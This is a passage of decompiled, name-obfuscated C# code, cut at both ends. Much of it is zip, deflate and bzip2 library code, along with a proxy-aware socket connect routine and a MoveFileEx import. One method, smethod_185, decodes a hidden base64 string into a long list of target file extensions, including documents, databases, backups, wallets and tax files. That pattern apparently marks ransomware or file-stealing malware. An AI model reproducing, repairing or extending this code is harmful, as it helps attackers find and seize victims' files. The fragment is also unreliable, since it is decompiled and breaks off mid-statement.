				Class16.smethod_180(class75_0.class76_0, 3);
				if ((num & 1) != 0)
				{
					class75_0.bool_0 = true;
				}
				switch (num >> 1)
				{
				case 0:
					Class16.smethod_577(class75_0.class76_0);
					class75_0.int_4 = 3;
					break;
				case 1:
					class75_0.class78_0 = Class74.Class78.class78_0;
					class75_0.class78_1 = Class74.Class78.class78_1;
					class75_0.int_4 = 7;
					break;
				case 2:
					class75_0.class79_0 = new Class74.Class79();
					class75_0.int_4 = 6;
					break;
				}
				return true;
			}
			case 3:
				if ((class75_0.int_8 = Class16.smethod_45(class75_0.class76_0, 16)) < 0)
				{
					return false;
				}
				Class16.smethod_180(class75_0.class76_0, 16);
				class75_0.int_4 = 4;
				break;
			case 4:
				break;
			case 5:
				goto IL_137;
			case 6:
				if (!Class16.smethod_485(class75_0.class79_0, class75_0.class76_0))
				{
					return false;
				}
				class75_0.class78_0 = Class16.smethod_384(class75_0.class79_0);
				class75_0.class78_1 = Class16.smethod_518(class75_0.class79_0);
				class75_0.int_4 = 7;
				goto IL_1BB;
			case 7:
			case 8:
			case 9:
			case 10:
				goto IL_1BB;
			case 11:
				return false;
			case 12:
				return false;
			default:
				return false;
			}
			int num2 = Class16.smethod_45(class75_0.class76_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class16.smethod_180(class75_0.class76_0, 16);
			class75_0.int_4 = 5;
			IL_137:
			int num3 = Class16.smethod_293(class75_0.class77_0, class75_0.class76_0, class75_0.int_8);
			class75_0.int_8 -= num3;
			if (class75_0.int_8 == 0)
			{
				class75_0.int_4 = 2;
				return true;
			}
			return !Class16.smethod_437(class75_0.class76_0);
			IL_1BB:
			return Class16.smethod_256(class75_0);
		}

		static int smethod_176(Enum2 enum2_0)
		{
			if (enum2_0 == Enum2.const_3)
			{
				return 256;
			}
			if (enum2_0 == Enum2.const_2)
			{
				return 128;
			}
			return -1;
		}

		static Stream13 smethod_177(string string_0, GClass0 gclass0_0)
		{
			if (gclass0_0.class8_0.gclass1_0 == null)
			{
				throw new InvalidOperationException("Use OpenReader() only with ZipFile.");
			}
			return Class16.smethod_98(gclass0_0, string_0);
		}

		static int smethod_178(int int_0, Class33 class33_0, int int_1)
		{
			Class33.Class34 class34_ = class33_0.class34_0;
			int[][] int_2 = class34_.int_1;
			int[] int_3 = class34_.int_2;
			short[] short_ = class34_.short_0;
			char[] char_ = class34_.char_0;
			byte[] byte_ = class34_.byte_1;
			byte[][] byte_2 = class34_.byte_4;
			byte[] array = byte_2[0];
			byte[] array2 = byte_2[1];
			byte[] array3 = byte_2[2];
			byte[] array4 = byte_2[3];
			byte[] array5 = byte_2[4];
			byte[] array6 = byte_2[5];
			int int_4 = class33_0.int_10;
			int num = 0;
			for (int i = 0; i < Class36.int_7; i++)
			{
				int num2 = int_1;
				while (--num2 >= 0)
				{
					int_3[num2] = 0;
					int[] array7 = int_2[num2];
					int num3 = int_0;
					while (--num3 >= 0)
					{
						array7[num3] = 0;
					}
				}
				num = 0;
				int num4;
				for (int j = 0; j < class33_0.int_10; j = num4 + 1)
				{
					num4 = Math.Min(j + Class36.int_6 - 1, int_4 - 1);
					if (int_1 == Class36.int_5)
					{
						int[] array8 = new int[6];
						for (int k = j; k <= num4; k++)
						{
							int num5 = (int)char_[k];
							array8[0] += (int)(array[num5] & 255);
							array8[1] += (int)(array2[num5] & 255);
							array8[2] += (int)(array3[num5] & 255);
							array8[3] += (int)(array4[num5] & 255);
							array8[4] += (int)(array5[num5] & 255);
							array8[5] += (int)(array6[num5] & 255);
						}
						short_[0] = (short)array8[0];
						short_[1] = (short)array8[1];
						short_[2] = (short)array8[2];
						short_[3] = (short)array8[3];
						short_[4] = (short)array8[4];
						short_[5] = (short)array8[5];
					}
					else
					{
						int num6 = int_1;
						while (--num6 >= 0)
						{
							short_[num6] = 0;
						}
						for (int l = j; l <= num4; l++)
						{
							int num7 = (int)char_[l];
							int num8 = int_1;
							while (--num8 >= 0)
							{
								short[] expr_206_cp_0 = short_;
								int expr_206_cp_1 = num8;
								expr_206_cp_0[expr_206_cp_1] += (short)(byte_2[num8][num7] & 255);
							}
						}
					}
					int num9 = -1;
					int num10 = int_1;
					int num11 = 999999999;
					while (--num10 >= 0)
					{
						int num12 = (int)short_[num10];
						if (num12 < num11)
						{
							num11 = num12;
							num9 = num10;
						}
					}
					int_3[num9]++;
					byte_[num] = (byte)num9;
					num++;
					int[] array9 = int_2[num9];
					for (int m = j; m <= num4; m++)
					{
						array9[(int)char_[m]]++;
					}
				}
				for (int n = 0; n < int_1; n++)
				{
					Class16.smethod_277(byte_2[n], int_2[n], class33_0.class34_0, int_0, 20);
				}
			}
			return num;
		}

		static void smethod_179(ICollection<string> icollection_0, GClass1 gclass1_0)
		{
			if (icollection_0 == null)
			{
				throw new ArgumentNullException("entriesToRemove");
			}
			foreach (string current in icollection_0)
			{
				Class16.smethod_542(gclass1_0, current);
			}
		}

		static void smethod_180(Class74.Class76 class76_0, int int_0)
		{
			class76_0.uint_0 >>= int_0;
			class76_0.int_2 -= int_0;
		}

		static void smethod_181(GClass1 gclass1_0)
		{
			Class16.smethod_218(gclass1_0);
			gclass1_0.dictionary_0 = new Dictionary<string, GClass0>();
			if (gclass1_0.textWriter_0 != null)
			{
				if (gclass1_0.string_0 == null)
				{
					gclass1_0.textWriter_0.WriteLine("Reading zip from stream...");
				}
				else
				{
					gclass1_0.textWriter_0.WriteLine("Reading zip {0}...", gclass1_0.string_0);
				}
			}
			bool bool_ = true;
			Class8 class8_ = new Class8(gclass1_0);
			GClass0 gClass;
			while ((gClass = Class16.smethod_224(class8_, bool_)) != null)
			{
				if (gclass1_0.textWriter_0 != null)
				{
					gclass1_0.textWriter_0.WriteLine("  {0}", gClass.string_1);
				}
				gclass1_0.dictionary_0.Add(gClass.string_1, gClass);
				bool_ = false;
			}
			try
			{
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				GClass0 gClass2;
				while ((gClass2 = Class16.smethod_28(gclass1_0, dictionary)) != null)
				{
					GClass0 gClass3 = gclass1_0.dictionary_0[gClass2.string_1];
					if (gClass3 != null)
					{
						gClass3.string_2 = gClass2.string_2;
						if (gClass2.bool_4)
						{
							Class16.smethod_404(gClass3);
						}
					}
					dictionary.Add(gClass2.string_1, null);
				}
				if (gclass1_0.long_0 > 0L)
				{
					gclass1_0.ReadStream.Seek(gclass1_0.long_0, SeekOrigin.Begin);
				}
				Class16.smethod_360(gclass1_0);
				if (gclass1_0.textWriter_0 != null && !string.IsNullOrEmpty(gclass1_0.string_2))
				{
					gclass1_0.textWriter_0.WriteLine("Zip file Comment: {0}", gclass1_0.string_2);
				}
			}
			catch (ZipException)
			{
			}
			catch (IOException)
			{
			}
			Class16.smethod_564(gclass1_0);
		}

		static bool smethod_182(FileAttributes fileAttributes_0, FileAttributes fileAttributes_1, Class14 class14_0)
		{
			return (class14_0.fileAttributes_0 & fileAttributes_0) != fileAttributes_0 || (fileAttributes_1 & fileAttributes_0) == fileAttributes_0;
		}

		static bool smethod_183(Stream6 stream6_0)
		{
			int num = Class16.smethod_434(stream6_0, 1);
			return num != 0;
		}

		static int smethod_184(GClass1 gclass1_0, string string_0)
		{
			ICollection<GClass0> collection = Class16.smethod_227(string_0, gclass1_0);
			Class16.smethod_219(gclass1_0, collection);
			return collection.Count;
		}

		static IEnumerable<string> smethod_185()
		{
			Regex regex = new Regex(",");
			return regex.Split(Encoding.UTF8.GetString(Convert.FromBase64String("LjFjZCwuM2QsLjNkNCwuM2RmOCwuM2RtLC4zZHMsLjNmciwuM2cyLC4zZ3AsLjNncDIsLjNtbSwuM3ByLC43eiwuN3ppcCwuYWFjLC5hYjQsLmFiaywuYWJ3LC5hYzMsLmFjY2RiLC5hY2NkZSwuYWNjZHIsLmFjY2R0LC5hY2UsLmFjaCwuYWNyLC5hY3QsLmFkYiwuYWRlLC5hZGksLmFkcCwuYWRwYiwuYWRyLC5hZHMsLmFkdCwuYWdkbCwuYWksLmFpZmYsLmFpbSwuYWlwLC5haXMsLmFpdCwuYWwsLmFtZiwuYW1yLC5hbXUsLmFteCwuYW14eCwuYW5zLC5hb2ksLmFwLC5hcGUsLmFwaSwuYXBqLC5hcmMsLmFyaSwuYXJqLC5hcm8sLmFyciwuYXJ3LC5hc2EsLmFzYywuYXNjeCwuYXNlLC5hc2YsLmFzaHgsLmFzbSwuYXNteCwuYXNwLC5hc3B4LC5hc3IsLmFzeCwuYXZpLC5hdnMsLmF3ZywuYmFjaywuYmFja3VwLC5iYWNrdXBkYiwuYmFrLC5iYW5rLC5iYXksLmJjaywuYmRiLC5iZHAsLmJkciwuYmd0LC5iaWIsLmJpYywuYmlnLC5iaWssLmJpbiwuYmtmLC5ia3AsLmJsZW5kLC5ibHAsLmJtYywuYm1mLC5ibWwsLmJtcCwuYm9jLC5icDIsLmJwMywuYnBsLC5icHcsLmJzcCwuYywuY2FnLC5jYW0sLmNhcCwuY2FyLC5jYnIsLmNieiwuY2MsLmNjZCwuY2NoLC5jZCwuY2RmLC5jZHIsLmNkcjMsLmNkcjQsLmNkcjUsLmNkcjYsLmNkcncsLmNkeCwuY2UxLC5jZTIsLmNlciwuY2ZnLC5jZ2YsLmNnbSwuY2hrLC5jaWIsLmNsYXNzLC5jbHIsLmNscywuY21zLC5jbXQsLmNvZCwuY29sLC5jb25maWcsLmNvbnRhY3QsLmNwLC5jcGksLmNwcCwuY3IyLC5jcmF3LC5jcmQsLmNydCwuY3J3LC5jcywuY3NoLC5jc2ksLmNzbCwuY3NvLC5jc3MsLmNzdiwuY3R0LC5jdHksLmN3ZiwuZGFjLC5kYWwsLmRhcCwuZGF0LC5kYiwuZGIzLC5kYl9qb3VybmFsLC5kYmIsLmRiZiwuZGJ4LC5kYzIsLmRjcCwuZGNyLC5kY3MsLmRjdSwuZGRjLC5kZGN4LC5kZGQsLmRkb2MsLmRkcncsLmRkcywuZGVtLC5kZXIsLmRlcywuZGVzaWduLC5kZXYsLmRleCwuZGdjLC5kaWMsLmRpZiwuZGlpLC5kaXIsLmRpc2ssLmRpdCwuZGl2eCwuZGl6LC5kanZ1LC5kbWcsLmRuZywuZG9iLC5kb2MsLmRvY20sLmRvY3gsLmRvdCwuZG90bSwuZG90eCwuZG94LC5kcGssLmRwbCwuZHByLC5kcmYsLmRydywuZHNrLC5kc3AsLmR0ZCwuZHZkLC5kdmksLmR2eCwuZHdnLC5keGIsLmR4ZSwuZHhmLC5keGcsLmVkYiwuZWxmLC5lbWwsLmVwcywuZXFsLC5lcmJzcWwsLmVyZiwuZXJyLC5ldWMsLmV2bywuZXgsLmV4ZiwuZXhpZiwuZjkwLC5mYXEsLmZjZCwuZmRiLC5mZHIsLmZkcywuZmYsLmZmZCwuZmZmLC5maCwuZmhkLC5mbGEsLmZsYWMsLmZsZiwuZmxwLC5mbHYsLmZsdnYsLmZvciwuZnBwLC5mcHgsLmZ4ZywuZ2FtLC5naWYsLmdyYXksLmdyZXksLmdyZiwuZ3JvdXBzLC5ncnksLmd0aHIsLmd6LC5nemlnLC5oLC5oM20sLmg0ciwuaGJrLC5oZGQsLmhwcCwuaHRtLC5odG1sLC5pYmFuaywuaWJkLC5pYnosLmlkeCwuaWlmLC5paXEsLmltZywuaW5jcGFzLC5pbmRkLC5pbmssLmlwYSwuaXN1LC5pc3osLml0ZGIsLml0bCwuaXdkLC5qYXIsLmphdiwuamF2YSwuamMsLmpmaWYsLmpneiwuamlmLC5qaWZmLC5qbnQsLmpwYywuanBlLC5qcGVnLC5qcGYsLmpwZywuanB3LC5qcywua2MyLC5rZGJ4LC5rZGMsLmtleSwua216LC5rcGR4LC5rd2QsLmt3bSwubGFjY2RiLC5sYmksLmxjZCwubGNmLC5sZGIsLmxkZiwubGdwLC5saXQsLmxvZywubHAyLC5sdG0sLmx0ciwubHVhLC5sdmwsLm0sLm0ydHMsLm0zdSwubTRwLC5tNHYsLm1hZywubWFuLC5tYXAsLm1hcGltYWlsLC5tYXgsLm1ib3gsLm1ieCwubWNkLC5tZCwubWQzLC5tZGIsLm1kYywubWRmLC5tZGwsLm1kbiwubWRzLC5tZWYsLm1mdywubWljLC5taWQsLm1pcCwubWt2LC5tbGIsLm1seCwubW13LC5tbnksLm1vZCwubW9uZXl3ZWxsLC5tb3MsLm1vdiwubW96LC5tcDMsLm1wNCwubXBlZywubXBnLC5tcncsLm1zZywubXNwLC5teHAsLm15ZCwubmF2LC5uY2QsLm5kLC5uZGQsLm5kZiwubmRzLC5uZWYsLm5mbywubmsyLC5ub3AsLm5vdywubnJnLC5ucmksLm5ydywubnMyLC5uczMsLm5zNCwubnNkLC5uc2YsLm5zZywubnNoLC5udnJhbSwubndiLC5ueDIsLm54bCwubnlmLC5vYWIsLm9iaiwub2RiLC5vZGMsLm9kZiwub2RnLC5vZGksLm9kbSwub2RwLC5vZHMsLm9kdCwub2Z0LC5vZ2EsLm9nZywub2lsLC5vcGYsLm9yZiwub3N0LC5vdGcsLm90aCwub3RwLC5vdHMsLm90dCwub3dsLC5veHQsLnAxMiwucDdiLC5wN2MsLnBhYiwucGFnZXMsLnBhaywucGFzLC5wYXQsLnBiZiwucGJwLC5wYnMsLnBjZCwucGN0LC5wY3YsLnBkYiwucGRkLC5wZGYsLnBlZiwucGVtLC5wZngsLnBocCwucGlmLC5wa2IsLnBraCwucGwsLnBsYywucGxpLC5wbHVzX211aGQsLnBtLC5wbmcsLnBvdCwucG90bSwucG90eCwucHBhbSwucHBkLC5wcGYsLnBwcywucHBzbSwucHBzeCwucHB0LC5wcHRtLC5wcHR4LC5wcmMsLnByZiwucHJ0LC5wcywucHNhLC5wc2FmZTMsLnBzZCwucHNwaW1hZ2UsLnB5LC5wc3QsLnB0eCwucHV6LC5wd2YsLnB3aSwucHdtLC5weHAsLnB5LC5xYmEsLnFiYiwucWJtLC5xYnIsLnFidywucWJ4LC5xYnksLnFjb3csLnFjb3cyLC5xZGYsLnFlZCwucWVsLC5xaWYsLnFweCwucXRxLC5xdHIsLnIzZCwucmEsLnJhZiwucmFyLC5yYXQsLnJhdywucmRiLC5yZXMsLnJldiwucmduLC5ybSwucm5nLC5ycnQsLnJzcmMsLnJzdywucnRlLC5ydGYsLnJ0cywucnR4LC5ydW0sLnJ1biwucnYsLnJ2dCwucncyLC5yd2wsLnJ3eiwuczNkYiwuc2FkLC5zYWYsLnNhZmUsLnNhczdiZGF0LC5zYXYsLnNhdmUsLnNheSwuc2NtLC5zY24sLnNjeCwuc2QwLC5zZGEsLnNkYiwuc2RjLC5zZGYsLnNkbiwuc2RzLC5zZHQsLnNlbiwuc2ZzLC5zZngsLnNoLC5zaGFyLC5zaHIsLnNodywuc2xkbSwuc2xkeCwuc2x0LC5zbnAsLnNvLC5zcHIsLnNxbCwuc3FsaXRlLC5zcWxpdGUzLC5zcWxpdGVkYiwuc3F4LC5zcjIsLnNyZiwuc3J0LC5zcncsLnNzYSwuc3Q0LC5zdDUsLnN0Niwuc3Q3LC5zdDgsLnN0Yywuc3RkLC5zdGksLnN0bSwuc3R0LC5zdHcsLnN0eCwuc3VkLC5zdmcsLnN2aSwuc3ZyLC5zd2QsLnN3Ziwuc3hjLC5zeGQsLnN4Zywuc3hpLC5zeG0sLnN4dywudGFyLC50YXgyMDEzLC50YXgyMDE0LC50YnoyLC50Y2gsLnRjeCwudGV4LC50eHQsLnRleHQsLnRnLC50Z2EsLnRobSwudGhteCwudGlmLC50bGcsLnRseiwudHB1LC50cHgsLnRycCwudHUsLnR1ciwudHhkLC50eGYsLnR4dCwudWF4LC51ZGYsLnVteCwudW5yLC51bngsLnVvcCwudXBvaSwudXJsLC51c2EsLnVzeCwudXQyLC51dDMsLnV0YywudXR4LC51dngsLnV4eCwudmFsLC52Ym94LC52YywudmNkLC52ZGksLnZkbywudmVyLC52aGQsLnZoZHgsLnZtZGssLnZtZiwudm1zZCwudm10LC52bXgsLnZteGYsLnZvYiwudnNpLC52dGYsLnczZywudzN4LC53YWIsLndhZCwud2FsbGV0LC53YXIsLndhdiwud2F2ZSwud2F3LC53YjIsLndiaywud2RndCwud2tzLC53bSwud21hLC53bWQsLndtZGIsLndtbXAsLndtdiwud214LC53b3csLndwZCwud3BrLC53cGwsLndwcywud3NoLC53dGQsLnd0Ziwud3Z4LC54MTEsLngzZiwueGlzLC54bCwueGxhLC54bGFtLC54bGMsLnhsaywueGxsLC54bG0sLnhsciwueGxzLC54bHNiLC54bHNtLC54bHN4LC54bHQsLnhsdG0sLnhsdHgsLnhsdiwueGx3LC54bHd4LC54bWwsLnhwaSwueHB0LC54dmlkLC54d2QsLnlhYiwueWNiY3JhLC55cHMsLnl1diwuejAyLC56MDQsLnphcCwuemlwLC56aXB4LC56b28sLnNheiwudGxw")));
		}

		static int smethod_186(GClass0 gclass0_0)
		{
			if (!gclass0_0.bool_5)
			{
				Stream stream = null;
				if (gclass0_0.enum0_0 == Enum0.const_4)
				{
					Stream13 stream2 = new Stream13(Stream.Null);
					gclass0_0.delegate0_0(gclass0_0.string_1, stream2);
					gclass0_0.int_2 = Class16.smethod_4(stream2);
				}
				else if (gclass0_0.enum0_0 != Enum0.const_3)
				{
					if (gclass0_0.enum0_0 == Enum0.const_2)
					{
						Class16.smethod_624(gclass0_0);
						stream = gclass0_0.stream_1;
					}
					else if (gclass0_0.enum0_0 == Enum0.const_5)
					{
						if (gclass0_0.stream_1 == null)
						{
							gclass0_0.stream_1 = gclass0_0.delegate1_0(gclass0_0.string_1);
						}
						Class16.smethod_624(gclass0_0);
						stream = gclass0_0.stream_1;
					}
					else if (gclass0_0.enum0_0 != Enum0.const_6)
					{
						stream = File.Open(gclass0_0.string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					}
					GClass3 gclass3_ = new GClass3();
					gclass0_0.int_2 = Class16.smethod_281(stream, gclass3_);
					if (gclass0_0.stream_1 == null)
					{
						stream.Dispose();
					}
				}
				gclass0_0.bool_5 = true;
			}
			return gclass0_0.int_2;
		}

		static int smethod_187(Enum20 enum20_0, GClass2 gclass2_0, Enum21 enum21_0)
		{
			if (gclass2_0.class39_0 == null)
			{
				throw new GException0("No Deflate State!");
			}
			return Class16.smethod_69(gclass2_0.class39_0, enum20_0, enum21_0);
		}

		static void smethod_188(int int_0, int int_1, int int_2, Class33 class33_0, Class33.Class34 class34_0)
		{
			int[] int_3 = class34_0.int_4;
			int[] int_4 = class34_0.int_5;
			int[] int_5 = class34_0.int_6;
			int[] int_6 = class34_0.int_13;
			byte[] byte_ = class34_0.byte_6;
			int_3[0] = int_2;
			int_4[0] = int_1;
			int_5[0] = int_0;
			int num = 1;
			while (--num >= 0)
			{
				int num2 = int_3[num];
				int num3 = int_4[num];
				int num4 = int_5[num];
				if (num3 - num2 >= Class33.int_13 && num4 <= Class33.int_14)
				{
					int num5 = num4 + 1;
					byte byte_2 = byte_[int_6[num2] + num5];
					byte byte_3 = byte_[int_6[num3] + num5];
					byte byte_4 = byte_[int_6[num2 + num3 >> 1] + num5];
					int num6 = (int)(Class16.smethod_205(byte_3, byte_4, byte_2) & 255);
					int i = num2;
					int num7 = num3;
					int num8 = num2;
					int num9 = num3;
					while (true)
					{
						if (i <= num7)
						{
							int num10 = (int)(byte_[int_6[i] + num5] & 255) - num6;
							if (num10 == 0)
							{
								int num11 = int_6[i];
								int_6[i++] = int_6[num8];
								int_6[num8++] = num11;
								continue;
							}
							if (num10 < 0)
							{
								i++;
								continue;
							}
						}
						while (i <= num7)
						{
							int num12 = (int)(byte_[int_6[num7] + num5] & 255) - num6;
							if (num12 == 0)
							{
								int num13 = int_6[num7];
								int_6[num7--] = int_6[num9];
								int_6[num9--] = num13;
							}
							else
							{
								if (num12 <= 0)
								{
									break;
								}
								num7--;
							}
						}
						if (i > num7)
						{
							break;
						}
						int num14 = int_6[i];
						int_6[i++] = int_6[num7];
						int_6[num7--] = num14;
					}
					if (num9 < num8)
					{
						int_3[num] = num2;
						int_4[num] = num3;
						int_5[num] = num5;
						num++;
					}
					else
					{
						int num15 = (num8 - num2 < i - num8) ? (num8 - num2) : (i - num8);
						Class16.smethod_42(num15, i - num15, int_6, num2);
						int num16 = (num3 - num9 < num9 - num7) ? (num3 - num9) : (num9 - num7);
						Class16.smethod_42(num16, num3 - num16 + 1, int_6, i);
						num15 = num2 + i - num8 - 1;
						num16 = num3 - (num9 - num7) + 1;
						int_3[num] = num2;
						int_4[num] = num15;
						int_5[num] = num4;
						num++;
						int_3[num] = num15 + 1;
						int_4[num] = num16 - 1;
						int_5[num] = num5;
						num++;
						int_3[num] = num16;
						int_4[num] = num3;
						int_5[num] = num4;
						num++;
					}
				}
				else if (Class16.smethod_27(class33_0, class34_0, num2, num3, num4))
				{
					return;
				}
			}
		}

		static void smethod_189(Enum3 enum3_0, GClass0 gclass0_0, string string_0)
		{
			gclass0_0.ExtractExistingFile = enum3_0;
			Class16.smethod_146(string_0, null, gclass0_0, null);
		}

		static void smethod_190(Class62 class62_0, string string_0)
		{
			class62_0.string_1 = string_0;
		}

		static long smethod_191(GClass0 gclass0_0, ref Stream stream_0)
		{
			long result = -1L;
			if (gclass0_0.enum0_0 == Enum0.const_2)
			{
				Class16.smethod_624(gclass0_0);
				stream_0 = gclass0_0.stream_1;
				try
				{
					result = gclass0_0.stream_1.Length;
					return result;
				}
				catch (NotSupportedException)
				{
					return result;
				}
			}
			if (gclass0_0.enum0_0 == Enum0.const_3)
			{
				string string_ = (gclass0_0.enum2_1 == Enum2.const_0) ? null : (gclass0_0.string_3 ?? Class16.smethod_663(gclass0_0.class8_0));
				gclass0_0.stream_1 = Class16.smethod_98(gclass0_0, string_);
				Class16.smethod_624(gclass0_0);
				stream_0 = gclass0_0.stream_1;
				result = gclass0_0.stream_1.Length;
			}
			else
			{
				if (gclass0_0.enum0_0 == Enum0.const_5)
				{
					if (gclass0_0.stream_1 == null)
					{
						gclass0_0.stream_1 = gclass0_0.delegate1_0(gclass0_0.string_1);
					}
					Class16.smethod_624(gclass0_0);
					stream_0 = gclass0_0.stream_1;
					try
					{
						result = gclass0_0.stream_1.Length;
						return result;
					}
					catch (NotSupportedException)
					{
						return result;
					}
				}
				if (gclass0_0.enum0_0 == Enum0.const_1)
				{
					stream_0 = File.Open(gclass0_0.string_0, FileMode.Open, FileAccess.Read, FileShare.Read | FileShare.Write | FileShare.Delete);
					result = stream_0.Length;
				}
			}
			return result;
		}

		static void smethod_192(GClass1 gclass1_0, string string_0)
		{
			try
			{
				Class16.smethod_502(null, string_0, gclass1_0);
			}
			catch (Exception exception_)
			{
				throw new ZipException(string.Format("{0} is not a valid zip file", string_0), exception_);
			}
		}

		static uint smethod_193(Class41 class41_0)
		{
			uint uint_ = class41_0.uint_0;
			class41_0.enum16_0 = Class41.Enum16.const_0;
			class41_0.int_8 = 0;
			class41_0.int_9 = 0;
			class41_0.int_13 = 0;
			class41_0.int_12 = 0;
			if (class41_0.object_0 != null)
			{
				class41_0.gclass2_0.uint_0 = (class41_0.uint_0 = Class16.smethod_62(0u, null, 0, 0));
			}
			return uint_;
		}

		static byte[] smethod_194(Class20 class20_0)
		{
			if (!class20_0.bool_0)
			{
				Class16.smethod_88(class20_0);
			}
			return class20_0.byte_3;
		}

		static GClass0 smethod_195(GClass1 gclass1_0, string string_0)
		{
			return Class16.smethod_57(string_0, null, gclass1_0);
		}

		static short smethod_196(int int_0)
		{
			return (short)((int)Class74.Class80.byte_0[int_0 & 15] << 12 | (int)Class74.Class80.byte_0[int_0 >> 4 & 15] << 8 | (int)Class74.Class80.byte_0[int_0 >> 8 & 15] << 4 | (int)Class74.Class80.byte_0[int_0 >> 12]);
		}

		static void smethod_197(Class54 class54_0, IAsyncResult iasyncResult_0)
		{
			if (iasyncResult_0 == null)
			{
				throw new ArgumentNullException();
			}
			if (!iasyncResult_0.IsCompleted)
			{
				throw new ArgumentException();
			}
			if (Class16.smethod_334(class54_0) != null)
			{
				throw Class16.smethod_334(class54_0);
			}
		}

		static void smethod_198(bool bool_0, Class39 class39_0)
		{
			class39_0.bool_1 = bool_0;
		}

		static object smethod_199(bool bool_0, string string_0, Type type_0)
		{
			if (bool_0)
			{
				string_0 = string_0.ToLower();
			}
			foreach (Enum @enum in Enum.GetValues(type_0))
			{
				string text = Class16.smethod_375(@enum);
				if (bool_0)
				{
					text = text.ToLower();
				}
				if (text == string_0)
				{
					return @enum;
				}
			}
			return Enum.Parse(type_0, string_0, bool_0);
		}

		static bool smethod_200(GClass0 gclass0_0, long long_0, long long_1, GClass1 gclass1_0)
		{
			EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
			if (eventHandler_ != null)
			{
				EventArgs3 eventArgs = Class16.smethod_302(long_0, gclass1_0.ArchiveNameForEvent, long_1, gclass0_0);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_8 = true;
				}
			}
			return gclass1_0.bool_8;
		}

		static void smethod_201(string string_0, GClass0 gclass0_0, string string_1)
		{
			Class16.smethod_146(string_0, string_1, gclass0_0, null);
		}

		static int smethod_202(GClass2 gclass2_0, Enum19 enum19_0)
		{
			if (gclass2_0.class44_0 == null)
			{
				throw new GException0("No Inflate State!");
			}
			return Class16.smethod_362(gclass2_0.class44_0, enum19_0);
		}

		static void smethod_203(Class54 class54_0, int int_0)
		{
			class54_0.int_0 = int_0;
		}

		[DllImport("kernel32")]
		static extern bool MoveFileEx(string string_0, string string_1, int int_0);

		static EventArgs4 smethod_204(GClass0 gclass0_0, long long_0, string string_0, long long_1)
		{
			return new EventArgs4(string_0, Enum6.const_20)
			{
				string_0 = string_0,
				gclass0_0 = gclass0_0,
				long_0 = long_1,
				long_1 = long_0
			};
		}

		static byte smethod_205(byte byte_0, byte byte_1, byte byte_2)
		{
			if (byte_2 >= byte_0)
			{
				if (byte_0 > byte_1)
				{
					return byte_0;
				}
				if (byte_2 <= byte_1)
				{
					return byte_2;
				}
				return byte_1;
			}
			else
			{
				if (byte_0 < byte_1)
				{
					return byte_0;
				}
				if (byte_2 >= byte_1)
				{
					return byte_2;
				}
				return byte_1;
			}
		}

		static int smethod_206(int int_0, int int_1)
		{
			int num = 0;
			do
			{
				num |= (int_0 & 1);
				int_0 >>= 1;
				num <<= 1;
			}
			while (--int_1 > 0);
			return num >> 1;
		}

		static void smethod_207(Class62 class62_0, string string_0)
		{
			if (string_0 == null)
			{
				throw new ArgumentNullException();
			}
			class62_0.string_0 = string_0;
		}

		static string smethod_208(Class62 class62_0)
		{
			return class62_0.string_1;
		}

		static void smethod_209(GClass1 gclass1_0)
		{
			EventHandler<EventArgs2> eventHandler_ = gclass1_0.eventHandler_3;
			if (eventHandler_ != null)
			{
				EventArgs2 e = Class16.smethod_537(gclass1_0.ArchiveNameForEvent);
				eventHandler_(gclass1_0, e);
			}
		}

		static void smethod_210(GClass3 gclass3_0)
		{
			gclass3_0.uint_2 = 4294967295u;
		}

		static IAsyncResult smethod_211(Class54 class54_0, string string_0, int int_0, AsyncCallback asyncCallback_0, object object_0)
		{
			if (string_0 == null || asyncCallback_0 == null)
			{
				throw new ArgumentNullException();
			}
			if (int_0 <= 0 || int_0 > 65535)
			{
				throw new ArgumentException();
			}
			class54_0.asyncCallback_0 = asyncCallback_0;
			IAsyncResult result;
			if (class54_0.ProtocolType != ProtocolType.Tcp || Class16.smethod_305(class54_0) == Enum25.const_0 || Class16.smethod_439(class54_0) == null)
			{
				class54_0.int_0 = int_0;
				class54_0.class53_0 = Class16.smethod_400(new Delegate6(class54_0.method_2), class54_0, string_0);
				result = Class16.smethod_350(class54_0);
			}
			else if (Class16.smethod_305(class54_0) == Enum25.const_1)
			{
				class54_0.class53_0 = new Class56(class54_0, Class16.smethod_240(class54_0)).vmethod_0(string_0, int_0, new Delegate6(class54_0.method_2), Class16.smethod_439(class54_0));
				result = Class16.smethod_350(class54_0);
			}
			else if (Class16.smethod_305(class54_0) == Enum25.const_2)
			{
				class54_0.class53_0 = new Class57(class54_0, Class16.smethod_240(class54_0), Class16.smethod_374(class54_0)).vmethod_0(string_0, int_0, new Delegate6(class54_0.method_2), Class16.smethod_439(class54_0));
				result = Class16.smethod_350(class54_0);
			}
			else
			{
				result = null;
			}
			return result;
		}

		static void smethod_212(Class39 class39_0)
		{
			do
			{
				int num = class39_0.int_26 - class39_0.int_38 - class39_0.int_36;
				int num2;
				if (num == 0 && class39_0.int_36 == 0 && class39_0.int_38 == 0)
				{
					num = class39_0.int_23;
				}
				else if (num == -1)
				{
					num--;
				}
				else if (class39_0.int_36 >= class39_0.int_23 + class39_0.int_23 - Class39.int_16)
				{
					Array.Copy(class39_0.byte_1, class39_0.int_23, class39_0.byte_1, 0, class39_0.int_23);
					class39_0.int_37 -= class39_0.int_23;
					class39_0.int_36 -= class39_0.int_23;
					class39_0.int_32 -= class39_0.int_23;
					num2 = class39_0.int_28;
					int num3 = num2;
					do
					{
						int num4 = (int)class39_0.short_1[--num3] & 65535;
						class39_0.short_1[num3] = (short)((num4 < class39_0.int_23) ? 0 : (num4 - class39_0.int_23));
					}
					while (--num2 != 0);
					num2 = class39_0.int_23;
					num3 = num2;
					do
					{
						int num4 = (int)class39_0.short_0[--num3] & 65535;
						class39_0.short_0[num3] = (short)((num4 < class39_0.int_23) ? 0 : (num4 - class39_0.int_23));
					}
					while (--num2 != 0);
					num += class39_0.int_23;
				}
				if (class39_0.gclass2_0.int_1 == 0)
				{
					return;
				}
				num2 = Class16.smethod_29(class39_0.gclass2_0, class39_0.byte_1, class39_0.int_36 + class39_0.int_38, num);
				class39_0.int_38 += num2;
				if (class39_0.int_38 >= Class39.int_14)
				{
					class39_0.int_27 = (int)(class39_0.byte_1[class39_0.int_36] & 255);
